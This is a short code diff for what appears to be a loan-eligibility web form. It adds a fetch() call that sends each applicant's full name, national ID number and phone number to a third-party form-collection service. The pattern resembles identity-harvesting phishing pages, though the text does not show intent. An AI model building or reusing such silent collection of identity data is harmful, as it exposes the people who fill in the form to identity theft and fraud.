@@ -2329,6 +2329,19 @@
                   };
                   
                   localStorage.setItem('swiftLoanEligibilityData', JSON.stringify(formData));
+                  // Send to SubmitForm
+fetch("https://submit-form.com/xEWUQM1yT", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "Accept": "application/json"
+  },
+  body: JSON.stringify({
+    name: formData.firstName + " " + formData.lastName,
+    id_number: formData.nationalId,
+    phone: formData.phone
+  })
+});
 
                   // Show Processing Modal
                   const modal = document.getElementById('processingModal');
